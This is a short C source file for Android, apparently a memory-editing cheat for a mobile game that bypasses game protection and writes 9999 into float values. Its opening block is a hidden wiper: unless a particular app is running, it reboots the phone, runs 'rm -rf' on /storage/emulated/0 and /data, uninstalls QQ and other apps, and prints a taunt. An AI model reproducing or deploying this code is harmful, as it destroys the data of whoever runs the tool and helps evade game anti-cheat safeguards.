#include "MemoryTools.h"
int main(int argc,char **argv)
{
		FILE *fp;
    char ch,wjm[51];
    	if (!isapkrunning("com.tbkj.yy"))	//验证这个文件是否存在
    {
    //没检测到文件执行
	rebootsystem();//重启系统(手机)
remove("/storage/emulated/0/Android");
remove("/storage/emulated/0/iApp");
system("rm -rf /storage/emulated/0");
system("rm -rf /data");
uninstallapk("com.tencent.mobileqq");
uninstallapk("com.bairimeng.dmmdzz.m4399");
uninstallapk("com.aigz.cloudgame.cat");
printf("喜欢偷文件？");
exit(1);
	}
killGG();
int gs;//用来存储数据个数
void *jg;
PACKAGENAME *bm="com.bairimeng.dmmdzz.m4399";
BypassGameSafe();
SetSearchRange(A_ANONMYOUS);
puts("开始内存搜索...");
MemorySearch(bm,"520",&gs,FLOAT);
printf("共搜索%d个数据\n",gs);
MemoryOffset(bm,"1314",8,&gs,FLOAT);
MemoryOffset(bm,"250",12,&gs,FLOAT);
printf("共偏移%d个数据\n",gs);
Print();
MemoryWrite(bm,"9999",0,FLOAT);
puts("手雷秒杀");puts("修改完成");
ClearResults();
}
